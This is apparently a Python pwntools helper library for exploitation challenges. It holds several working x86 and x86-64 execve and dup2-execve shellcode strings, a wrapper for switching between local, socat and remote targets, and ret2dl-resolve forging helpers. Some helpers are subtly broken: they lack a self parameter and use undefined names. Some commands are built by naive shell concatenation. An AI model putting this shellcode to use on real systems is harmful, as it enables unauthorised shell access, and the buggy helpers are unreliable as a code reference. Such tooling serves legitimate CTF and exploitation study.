from pwn import *
from enert import *

sc_execve32_short = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" #21
sc_execve32       = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" #24
sc_execve32       = b"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" #24
sc_dup2execve32   = b"\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" #42
sc_execve64_short = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05" #23
sc_execve64       = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05" #29
sc_dup2execve64   = b"\x31\xd2\x31\xf6\x67\x8d\x7a\x04\x67\x8d\x42\x21\x0f\x05\xff\xc6\x67\x8d\x42\x21\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05" #51

context.log_level = "debug"
context.terminal = "screen"

class Pwn():
    def __init__(self,
                 target=None,
                 l_libc="",
                 r_libc="",
                 l_host="localhost",
                 r_host="remote.com",
                 l_port=4444,
                 r_port=2222,
                 r_user="user",
                 r_password="password",
                 ssh=False,
                 analyze_elf=True,
                 ):
        print("[+]starting...")
        self.target = target
        self.l_libc = l_libc
        self.r_libc = r_libc
        self.libc= None
        self.l_host = l_host
        self.l_port = l_port
        self.r_host = r_host
        self.r_port = r_port
        self.r_user = r_user
        self.r_password = r_password
        self.ssh = ssh
        context.binary = self.target
        if analyze_elf:
            self.elf = ELF(self.target)
        else:
            self.elf = None
        self._update_pwnlib()

    def _update_pwnlib(self):
        def section(self, name):
                section_info = self.get_section_by_name(name)
                section_addr = section_info.header["sh_addr"]
                return section_addr
        ELF.section = section

    def analyze_argv(self, argv):
        if len(argv) > 1 and argv[1] == "socat":
            f = File(self.target)
            Shell("killall socat 2>&1 1> /dev/null").call()
            Shell("socat tcp-listen:4444,reuseaddr,fork exec:%s &" % f.abspath).call()
            exit()
        if len(argv) > 1 and "d" in argv[1]:
            self.debug = True
        else:
            self.debug = False
        if len(argv) > 1 and "r" in argv[1]:
            if self.ssh:
                self.s = ssh(host=self.r_host, port=self.r_port, user=self.r_user, password=self.r_password);
                self.s = s.process(self.target)
            else:
                self.s = remote(self.r_host, self.r_port)
            if self.r_libc:
                self.libc = ELF(self.r_libc)
        elif len(argv) > 1 and "l" in argv[1]:
            self.s = remote(self.l_host, self.l_port)
            if self.l_libc:
                self.libc = ELF(self.l_libc)
        else:
            self.s = process(self.target)
            if self.l_libc:
                self.libc = ELF(self.l_libc)

    def _get_pid(self, lines):
        for line in lines:
            pid = Shell("echo '" + line + "' | awk '{print $2}'").readlines()[0][0]
            last_cmd = Shell("echo '" + line + "' | awk '{print $NF}'").readlines()[0][0]
            lastlast_cmd = Shell("echo '" + line + "' | awk '{print $(NF-1)}'").readlines()[0][0]
            lastlast_cmd = lastlast_cmd.split(":")
            if len(lastlast_cmd) == 2:
                a = lastlast_cmd[0]
                b = lastlast_cmd[1]
                if a.isdigit() and b.isdigit():
                    return pid
                else:
                    continue
            return None
    
    def attach(self):
        args = []
        if not self.debug:
            return
        ps = Shell("ps aux | rg " + self.target).readlines()[0]
        pid = self._get_pid(ps)
        if pid == None:
            realpath_binary = Shell("realpath " + self.target).readlines()[0][0]
            ps = Shell("ps aux | rg " + realpath_binary).readlines()[0]
            pid = self._get_pid(ps)
        if pid == None:
            pid = proc.pidof(self.s)
            pid = str(pid[0])
        if pid == None:
            print(red("pid is not found", "bold"))
            exit()
        print('[%s] wating attach at %s' % (red('+', 'bold'), pid))
        File('/tmp/gdb.pid').write(pid)
        pause_file = '/tmp/gdb.pause'
        f = File(pause_file)
        if not f.exist():
            f.create()
        while True:
            if not f.exist():
                break

    def make_reloc_32(sym_addr):
        R_386_JMP_SLOT = 0x7
        sym_obj_size = 0x10

        dynsym_section_addr = self.elf.get_section_by_name(".dynsym").header["sh_addr"]
        sym_arr_idx = (sym_addr - dynsym_section_addr) // sym_obj_size

        r_offset = setvbuf_got_addr
        r_info = (sym_arr_idx << 8) | R_386_JMP_SLOT

        reloc = b""
        reloc += p32(r_offset)
        reloc += p32(r_info)

        return reloc

    def make_sym_32(fname_addr):
        dynstr_section_addr = self.elf.get_section_by_name(".dynstr").header["sh_addr"]

        st_name = fname_addr - dynstr_section_addr
        st_value = 0
        st_size = 0
        st_info = 0
        st_other = 0
        st_shndx = 0x12 # 0 is also okay usually

        sym = b""
        sym += p32(st_name)
        sym += p32(st_value)
        sym += p32(st_size)
        sym += bytes([st_info])
        sym += bytes([st_other])
        sym += p16(st_shndx)

        return sym
